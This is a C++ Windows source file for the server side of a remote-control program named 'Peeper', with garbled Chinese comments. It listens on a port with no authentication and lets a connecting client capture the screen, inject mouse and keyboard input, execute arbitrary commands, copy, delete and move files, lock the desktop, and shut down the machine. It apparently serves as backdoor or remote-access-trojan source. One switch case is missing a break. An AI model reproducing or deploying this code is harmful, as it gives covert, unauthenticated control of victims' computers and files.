// ��������
#include "stdafx.h"
#include "SocketThread.h"

static CWinThread *g_pSendDIBThread			= NULL;
static CWinThread *g_pWaitCommandThread		= NULL;
static CWinThread *g_pSendInfoThread		= NULL;
static CString     g_strAString				= _T("");
static int         g_nAInt					= 0;

UINT SendInfoThread(LPVOID lParam)
{
	BOOL bSend = FALSE;
	while(1)//һֱ���
	{
		BOOL bOk = ::PL_DetectInternetConnect();//��������Ƿ���ͨ����
		if(bOk)
		{
			TRACE("������������������������\n");//�ǽ���ص����������ָ���Ĵ���
			if(!bSend)
			{
				bSend = bOk;
			}
		}
		else
		{
			bSend = FALSE;
		}
		::Sleep(10000);
	}
	return 0;
}

UINT WaitCommandThread(LPVOID lParam)
{
	BYTE chFlag = (BYTE)lParam;
	switch(chFlag)
	{
	case PL_MSG:
		{
			if(g_strAString.GetLength() > 0)
			{
				::MessageBox(NULL, g_strAString, _T("Warning!"),
					MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
				g_strAString = _T("");
			}
		}
		break ;
	case PL_FUNC_EXEC:
		{
			if(g_strAString.GetLength() > 0)
			{
				::PL_ExecuteCommand(g_strAString.GetBuffer(0));
				g_strAString.ReleaseBuffer();
				g_strAString = _T("");
			}
		}
		break ;
	case PL_FUNC_FILE_COPY_S:
		{
			if(g_strAString.GetLength() > 0 && g_nAInt > 0)
			{
				::PL_CopyFileServer(g_nAInt, g_strAString.GetBuffer(0), FALSE, NULL);
				g_strAString.ReleaseBuffer();
				g_strAString = _T("");
				g_nAInt = 0;
			}
		}
		break ;
	case PL_FUNC_FILE_COPY_C:
		{
			if(g_strAString.GetLength() > 0 && g_nAInt > 0)
			{
				::PL_CopyFileServer(g_nAInt, g_strAString.GetBuffer(0), TRUE, NULL);
				g_strAString.ReleaseBuffer();
				g_strAString = _T("");
				g_nAInt = 0;
			}
		}
		break ;
	default :
		break ;
	}

	g_pWaitCommandThread = NULL;

	return 0;
}

UINT SendDIBThread(LPVOID lParam)//����λͼ����
{
	int nRet = -1;
	SOCKET s = (SOCKET)lParam;

	//�ȴ��ͻ��˽���
	BYTE chData[20];
	ZeroMemory(chData, 20);
	nRet = ::PL_ReadSocketData(s, chData, 20, NULL);
	if(nRet > 0)
	{
		HWND hDesktopWnd = ::GetDesktopWindow();
		HBITMAP hBmp = ::PL_GetBitmap(hDesktopWnd);
		HDIB hDib = NULL;

		PL_ColorType ctColor = *((PL_ColorType *)(chData));
		PL_ZipType ztZip = *((PL_ZipType *)(chData+sizeof(PL_ColorType)));

		int nBits = 4;
		switch(ctColor)
		{
		case color_1:
			{
				nBits = 1;
			}
			break ;
		case color_4:
			{
				nBits = 4;
			}
			break ;
		case color_8:
			{
				nBits = 8;
			}
			break ;
		case color_24:
			{
				nBits = 24;
			}
			break ;
		default :
			{
				nBits = 4;
			}
			break ;
		}
		hDib = ::PL_BmpToDIB(hBmp, NULL, nBits);

		switch(ztZip)
		{
		case zip_none:
			{
				;
			}
			break ;
		case zip_lz77:
			{
				HDIB hZipDib = (HDIB)::PL_LZ77_Zip(hDib);
				::GlobalFree(hDib);
				hDib = hZipDib;
			}
			break ;
		case zip_lzw:
			{
				HDIB hZipDib = (HDIB)::PL_LZW_Zip(hDib);
				::GlobalFree(hDib);
				hDib = hZipDib;
			}
			break ;
		case zip_jpeg:
			{
			}
			break ;
		case zip_lzss:
			{
				HDIB hZipDib = (HDIB)::PL_LZSS_Zip(hDib);
				::GlobalFree(hDib);
				hDib = hZipDib;
			}
			break ;
		case zip_ari:
			{
				HDIB hZipDib = (HDIB)::PL_ARI_Zip(hDib);
				::GlobalFree(hDib);
				hDib = hZipDib;
			}
			break ;
		default :
			break ;
		}
		//���ͣ���ʼ�ź�
		SIZE sz = ::PL_GetScreenSize();
		int nSize = GlobalSize(hDib);
		memcpy(chData, &nSize, sizeof(int));
		int cx = sz.cx;
		int cy = sz.cy;
		memcpy(chData+sizeof(int), &cx, sizeof(int));
		memcpy(chData+sizeof(int)*2, &cy, sizeof(int));
		nRet = ::PL_SendSocketData(s, chData, sizeof(int)*3, PL_DIB);
		//��������bits
		LPBYTE lpData = (LPBYTE)GlobalLock(hDib);
		for(int i = 0; i < nSize/PL_SOCKET_MAXBYTES; i ++)
		{
			nRet = ::PL_SendSocketData(s, (BYTE *)(lpData+(i*PL_SOCKET_MAXBYTES)),
				PL_SOCKET_MAXBYTES);
		}
		int nRem = nSize - nSize/PL_SOCKET_MAXBYTES*PL_SOCKET_MAXBYTES;
		nRet = ::PL_SendSocketData(s, (BYTE *)(lpData + nSize/PL_SOCKET_MAXBYTES*PL_SOCKET_MAXBYTES), nRem);
		GlobalUnlock(hDib);
		::DeleteObject(hBmp);
		GlobalFree(hDib);
	}
	g_pSendDIBThread = NULL;

	return 0;
}

CSocketThread::CSocketThread(UINT uPort)
{
	m_uPort = uPort;
	m_sckClient[0] = INVALID_SOCKET;
	m_sckClient[1] = INVALID_SOCKET;
	m_sckServer = INVALID_SOCKET;

	m_nBits = 4;
}

CSocketThread::~CSocketThread()
{
	if(g_pSendInfoThread != NULL)
	{
		::TerminateThread(g_pSendInfoThread->m_hThread, 0);
		::WaitForSingleObject(g_pSendInfoThread->m_hThread, INFINITE);
		g_pSendInfoThread = NULL;
	}
	::PL_TermSocket();
	ExitServer();
}

int CSocketThread::Run()
{
	g_pSendInfoThread = AfxBeginThread(SendInfoThread, NULL, THREAD_PRIORITY_IDLE);
	while(1)
	{
		if(CreateServer())
		{
			BYTE *chData = new BYTE[PL_SOCKET_MAXBYTES+1];
			while(1)
			{
				ZeroMemory(chData, PL_SOCKET_MAXBYTES+1);
				int nRet = ::PL_ReadSocketData(m_sckClient[0], chData, PL_SOCKET_MAXBYTES, NULL);
				if(nRet != SOCKET_ERROR)
				{
					// ��������
					nRet = DoReceive(chData, nRet);
				}
				else
				{
					TRACE(_T("�������ݴ��󣬶Ͽ�......\n"));
					break ;
				}
			}
			delete []chData;
			chData = NULL;
		}
		ExitServer();
	}
	return ExitInstance();
}

int CSocketThread::DoReceive(BYTE *chData, int nLen)
{
	int nRet = 0;
	switch(chData[0])//��һ���ַ�Ϊ����
	{
	case PL_PEEPER_VER://ȡ����˰汾
		{
			char chTemp[15];
			ZeroMemory(chTemp, 15);
			sprintf(chTemp, "%s", PEEPER_SERVER_VER_15);
			::PL_SendSocketData(m_sckClient[0], (BYTE *)chTemp, strlen(chTemp),
				PL_PEEPER_VER);
		}
		break ;
	case PL_CLOSE_PEEPER://�رշ���,�˳�����
		{
			ExitServer();
			ExitThread(0);
		}
		break ;
	case PL_CLIENT_CLOSE://�ر�����
		{
			ExitServer();
		}
		break ;
	case PL_MSG://��ʾһ���Ի�����Ϣ��ʹ�����߳�
		{
			g_strAString.Format(_T("%s"), chData+1);
			if(g_pWaitCommandThread != NULL)
			{
				::TerminateThread(g_pWaitCommandThread->m_hThread, 0);
				::WaitForSingleObject(g_pWaitCommandThread->m_hThread, INFINITE);
				g_pWaitCommandThread = NULL;
			}
			g_pWaitCommandThread = AfxBeginThread(WaitCommandThread, (LPVOID)PL_MSG);
		}
		break ;
	case PL_DIB://�������ͼ��
		{
			if(g_pSendDIBThread != NULL)
			{
				::TerminateThread(g_pSendDIBThread->m_hThread, 0);
				::WaitForSingleObject(g_pSendDIBThread->m_hThread, INFINITE);
				g_pSendDIBThread = NULL;
			}
			g_pSendDIBThread = AfxBeginThread(SendDIBThread, (LPVOID)m_sckClient[1]);
		}
		break ;
	case PL_DIB_BITS://����ͼ����ɫ��
		{
			m_nBits = *((int*)(chData+1));
		}
		break ;
	case PL_SCREEN_SIZE://��ʾ���ֱ���
		{
			int cx = ::GetSystemMetrics(SM_CXSCREEN);
			int cy = ::GetSystemMetrics(SM_CYSCREEN);
			BYTE chTemp[15];
			ZeroMemory(chTemp, 15);
			memcpy(chTemp, &cx, sizeof(int));
			memcpy(chTemp + sizeof(int), &cy, sizeof(int));
			::PL_SendSocketData(m_sckClient[0], chTemp, sizeof(int)*2);
		}
	case PL_MOUSE_MOVE://����ƶ�
		{
			POINT point;
			point.x = *((int *)(chData+1));
			point.y = *((int *)(chData+1+sizeof(int)));
			::PL_MouseMove(point);
			::PL_SendSocketData(m_sckClient[0], NULL, 0, PL_TEMP);
		}
		break ;
	case PL_MOUSE_LBUTTONDOWN://����������
		{
			POINT point;
			point.x = *((int *)(chData+1));
			point.y = *((int *)(chData+1+sizeof(int)));
			BOOL bMouseMove = *((BOOL*)(chData+1+sizeof(int)*2));
			bMouseMove = !!bMouseMove;
			::PL_MouseLButtonDown(point, bMouseMove);
			::PL_SendSocketData(m_sckClient[0], NULL, 0, PL_TEMP);
		}
		break ;
	case PL_MOUSE_LBUTTONUP://����������
		{
			POINT point;
			point.x = *((int *)(chData+1));
			point.y = *((int *)(chData+1+sizeof(int)));
			BOOL bMouseMove = *((BOOL*)(chData+1+sizeof(int)*2));
			bMouseMove = !!bMouseMove;
			::PL_MouseLButtonUp(point, bMouseMove);
			::PL_SendSocketData(m_sckClient[0], NULL, 0, PL_TEMP);
		}
		break ;
	case PL_MOUSE_RBUTTONDOWN://����Ҽ�����
		{
			POINT point;
			point.x = *((int *)(chData+1));
			point.y = *((int *)(chData+1+sizeof(int)));
			BOOL bMouseMove = *((BOOL*)(chData+1+sizeof(int)*2));
			bMouseMove = !!bMouseMove;
			::PL_MouseRButtonDown(point, bMouseMove);
			::PL_SendSocketData(m_sckClient[0], NULL, 0, PL_TEMP);
		}
		break ;
	case PL_MOUSE_RBUTTONUP://����Ҽ�����
		{
			POINT point;
			point.x = *((int *)(chData+1));
			point.y = *((int *)(chData+1+sizeof(int)));
			BOOL bMouseMove = *((BOOL*)(chData+1+sizeof(int)*2));
			bMouseMove = !!bMouseMove;
			::PL_MouseRButtonUp(point, bMouseMove);
			::PL_SendSocketData(m_sckClient[0], NULL, 0, PL_TEMP);
		}
		break ;
	case PL_MOUSE_LDBLCLK://������˫��
		{
			POINT point;
			point.x = *((int *)(chData+1));
			point.y = *((int *)(chData+1+sizeof(int)));
			BOOL bMouseMove = *((BOOL*)(chData+1+sizeof(int)*2));
			bMouseMove = !!bMouseMove;
			::PL_MouseLButtonDblClk(point, bMouseMove);
			::PL_SendSocketData(m_sckClient[0], NULL, 0, PL_TEMP);
		}
		break ;
	case PL_MOUSE_RDBLCLK://����Ҽ�˫��
		{
			POINT point;
			point.x = *((int *)(chData+1));
			point.y = *((int *)(chData+1+sizeof(int)));
			BOOL bMouseMove = *((BOOL*)(chData+1+sizeof(int)*2));
			bMouseMove = !!bMouseMove;
			::PL_MouseRButtonDblClk(point, bMouseMove);
			::PL_SendSocketData(m_sckClient[0], NULL, 0, PL_TEMP);
		}
		break ;
	case PL_KEY_DOWN://һ����������
		{
			UINT uChar = *((UINT *)(chData+1));
			UINT uFlag = *((UINT *)(chData+sizeof(UINT)+1));
			::PL_KeyDown(uChar, uFlag);
			::PL_SendSocketData(m_sckClient[0], NULL, 0, PL_TEMP);
		}
		break ;
	case PL_KEY_UP://һ����������
		{
			UINT uChar = *((UINT *)(chData+1));
			UINT uFlag = *((UINT *)(chData+sizeof(UINT)+1));
			::PL_KeyUp(uChar, uFlag);
			::PL_SendSocketData(m_sckClient[0], NULL, 0, PL_TEMP);
		}
		break ;
	case PL_FUNC_EXEC://ִ��һ������,ʹ�����߳�
		{
			g_strAString.Format(_T("%s"), chData+1);
			if(g_pWaitCommandThread != NULL)
			{
				::TerminateThread(g_pWaitCommandThread->m_hThread, 0);
				::WaitForSingleObject(g_pWaitCommandThread->m_hThread, INFINITE);
				g_pWaitCommandThread = NULL;
			}
			g_pWaitCommandThread = AfxBeginThread(WaitCommandThread, (LPVOID)PL_FUNC_EXEC);
		}
		break ;
	case PL_FUNC_LOCK://��������
		{
			BOOL bLock = *((BOOL*)(chData+1));
			::PL_LockDesktop(!!bLock);//��0ֵת����1,��0ֵ����0
		}
		break ;
	case PL_FUNC_EXITWIN://�ػ�/����/ע��
		{
			UINT uFlag = *((UINT *)(chData+1));
			::PL_ExitWindow(uFlag);
		}
		break ;
	case PL_FUNC_CTRL_ALT_DEL://������,���Ҳ���
		{
			::PL_Send_CtrlAltDel();
		}
		break ;
	case PL_FUNC_FILE_COPY_S://�����ļ�
		{
			char chFile[255];
			ZeroMemory(chFile, 255);
			sprintf(chFile, "%s", chData+1);
			BYTE chTemp[10];
			ZeroMemory(chTemp, 10);
			int nRet = ::PL_ReadSocketData(m_sckClient[0], chTemp, 10);
			if(nRet > 0)
			{
				nRet = ::PL_SendSocketData(m_sckClient[0], NULL, 0, PL_TEMP);
				g_nAInt = *((int*)(chTemp));
				g_strAString.Format(_T("%s"), chFile);
				if(g_pWaitCommandThread != NULL)
				{
					::TerminateThread(g_pWaitCommandThread->m_hThread, 0);
					::WaitForSingleObject(g_pWaitCommandThread->m_hThread, INFINITE);
					g_pWaitCommandThread = NULL;
				}
				g_pWaitCommandThread = AfxBeginThread(WaitCommandThread,
					(LPVOID)PL_FUNC_FILE_COPY_S);
			}
		}
		break ;
	case PL_FUNC_FILE_COPY_C:
		{
			char chFile[255];
			ZeroMemory(chFile, 255);
			sprintf(chFile, "%s", chData+1);
			BYTE chTemp[10];
			ZeroMemory(chTemp, 10);
			int nRet = ::PL_ReadSocketData(m_sckClient[0], chTemp, 10);
			if(nRet > 0)
			{
				nRet = ::PL_SendSocketData(m_sckClient[0], NULL, 0, PL_TEMP);
				g_nAInt = *((int*)(chTemp));
				g_strAString.Format(_T("%s"), chFile);
				if(g_pWaitCommandThread != NULL)
				{
					::TerminateThread(g_pWaitCommandThread->m_hThread, 0);
					::WaitForSingleObject(g_pWaitCommandThread->m_hThread, INFINITE);
					g_pWaitCommandThread = NULL;
				}
				g_pWaitCommandThread = AfxBeginThread(WaitCommandThread,
					(LPVOID)PL_FUNC_FILE_COPY_C);
			}
		}
		break ;
	case PL_FUNC_FILE_DELETE:
		{
			char chFile[255];
			ZeroMemory(chFile, 255);
			sprintf(chFile, "%s", chData+1);
			BOOL bRet = ::PL_DeleteFile(chFile);
			ZeroMemory(chFile, 255);
			memcpy(chFile, &bRet, sizeof(BOOL));
			::PL_SendSocketData(m_sckClient[0], (BYTE*)chFile, sizeof(BOOL), PL_RETURN_BOOL);
		}
		break ;
	case PL_FUNC_FILE_MOVE:
		{
			char chSrcFile[255];
			ZeroMemory(chSrcFile, 255);
			sprintf(chSrcFile, "%s", chData+1);
			char chDesFile[255];
			ZeroMemory(chDesFile, 255);
			nRet = ::PL_ReadSocketData(m_sckClient[0], (BYTE*)chDesFile, 255, NULL);
			if(nRet >  0)
			{
				BOOL bRet = ::PL_MoveFile(chSrcFile, chDesFile);
				ZeroMemory(chSrcFile, 255);
				memcpy(chSrcFile, &bRet, sizeof(BOOL));
				::PL_SendSocketData(m_sckClient[0], (BYTE*)chSrcFile,
					sizeof(BOOL), PL_RETURN_BOOL);
			}
		}
		break ;
	default :
		break ;
	}
	return nRet;
}

BOOL CSocketThread::CreateServer()
{
	BOOL bRet = FALSE;
	bRet = ::PL_InitSocket();
	if(!bRet)
	{
		return bRet;
	}

	char chName[256];
	sockaddr_in addr;
	hostent* pEnt = NULL;
	int addrlen = 0, nRet = 0;

	nRet = ::gethostname(chName, 256);
	if(nRet == 0)
	{
		m_sckServer = socket(AF_INET, SOCK_STREAM, 0);
		if(m_sckServer != INVALID_SOCKET)
		{
			pEnt = ::gethostbyname(chName);
			if(pEnt)
			{
				addr.sin_family = AF_INET;
				addr.sin_port = htons(m_uPort);
				addr.sin_addr.s_addr = INADDR_ANY;

				nRet = ::bind(m_sckServer, (sockaddr*)&addr, sizeof(addr));

				if(nRet != SOCKET_ERROR)
				{
					nRet = ::listen(m_sckServer, SOMAXCONN);
					if(nRet != SOCKET_ERROR)
					{
						addrlen = sizeof(addr);
						TRACE(_T("��ʼ���񣬵ȴ��ͻ�......\n"));
						m_sckClient[0] = ::accept(m_sckServer, (sockaddr*)&addr, &addrlen);
						if(m_sckClient[0] != INVALID_SOCKET)
						{
							//Ϊ��ͬ��
							::PL_SendSocketData(m_sckClient[0], NULL, 0, PL_TEMP, MSG_OOB);
						}
						m_sckClient[1] = ::accept(m_sckServer, (sockaddr*)&addr, &addrlen);
						if(m_sckClient[0] != INVALID_SOCKET &&
						   m_sckClient[1] != INVALID_SOCKET)
						{
							TRACE(_T("��������\n"));
							char chTemp[256];
							ZeroMemory(chTemp, 256);
							sockaddr_in name1;
							sockaddr_in name2;
							int nSize = sizeof(sockaddr_in);
							int nRet1 = ::getpeername(m_sckClient[0], (sockaddr*)&name1, &nSize);
							int nRet2 = ::getpeername(m_sckClient[1], (sockaddr*)&name2, &nSize);
							if(nRet1 == 0 && nRet2 == 0)
							{
sprintf(chTemp, "Connect is OK.\r\nServer Computer Name:%s,IP:%d.%d.%d.%d,Port:%d.\r\nClient[0]:IP=%d.%d.%d.%d  Port=%d.\r\nClient[1]:IP=%d.%d.%d.%d  Port=%d.",
									chName,
									(unsigned char)(pEnt->h_addr_list[0][0]),
									(unsigned char)(pEnt->h_addr_list[0][1]),
									(unsigned char)(pEnt->h_addr_list[0][2]),
									(unsigned char)(pEnt->h_addr_list[0][3]),
									m_uPort,
									name1.sin_addr.S_un.S_un_b.s_b1,
									name1.sin_addr.S_un.S_un_b.s_b2,
									name1.sin_addr.S_un.S_un_b.s_b3,
									name1.sin_addr.S_un.S_un_b.s_b4,
									name1.sin_port,
									name2.sin_addr.S_un.S_un_b.s_b1,
									name2.sin_addr.S_un.S_un_b.s_b2,
									name2.sin_addr.S_un.S_un_b.s_b3,
									name2.sin_addr.S_un.S_un_b.s_b4,
									name2.sin_port);
							}
							else
							{
								strcpy(chTemp, "Connect is OK.");
							}

							nRet = ::PL_SendSocketData(m_sckClient[0], (BYTE *)chTemp, strlen(chTemp)+1, MSG_OOB);
							bRet = TRUE;
						}
					}
				}
			}
		}
	}

	return bRet;
}

BOOL CSocketThread::ExitServer()
{
	TRACE(_T("�˳�,���µȴ�����......\n"));
	if(g_pSendDIBThread != NULL)
	{
		::TerminateThread(g_pSendDIBThread->m_hThread, 0);
		::WaitForSingleObject(g_pSendDIBThread->m_hThread, INFINITE);
		g_pSendDIBThread = NULL;
	}

	if(g_pWaitCommandThread != NULL)
	{
		::TerminateThread(g_pWaitCommandThread->m_hThread, 0);
		::WaitForSingleObject(g_pWaitCommandThread->m_hThread, INFINITE);
		g_pWaitCommandThread = NULL;
	}

	if(m_sckClient[0] != INVALID_SOCKET)
	{
		::closesocket(m_sckClient[0]);
	}
	if(m_sckClient[1] != INVALID_SOCKET)
	{
		::closesocket(m_sckClient[1]);
	}
	if(m_sckServer != INVALID_SOCKET)
	{
		::closesocket(m_sckServer);
	}
	m_sckClient[0] = INVALID_SOCKET;
	m_sckClient[1] = INVALID_SOCKET;
	m_sckServer = INVALID_SOCKET;

	return TRUE;
}

